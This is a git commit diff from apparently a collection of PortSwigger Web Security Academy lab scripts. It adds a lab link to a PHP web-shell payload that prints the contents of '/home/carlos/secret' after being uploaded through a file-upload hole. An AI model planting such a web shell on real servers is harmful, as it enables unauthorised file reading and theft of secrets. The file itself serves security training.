66a53eacd7c232f9af42a46a994054f4485bd4f9
Rogue Blue <rogueblueprint@protonmail.com>
2023-05-23 10:47:15 -0700

    Added lab link to payload

--- Port-Swigger-Lab-Scripts/File-Upload-Vulnerabilities/rce-via-web-shell.php
+++ Port-Swigger-Lab-Scripts/File-Upload-Vulnerabilities/rce-via-web-shell.php
@@ -3,5 +3,6 @@
     // https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
     // https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
     // https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal
+    // https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
     echo file_get_contents('/home/carlos/secret');
 ?>
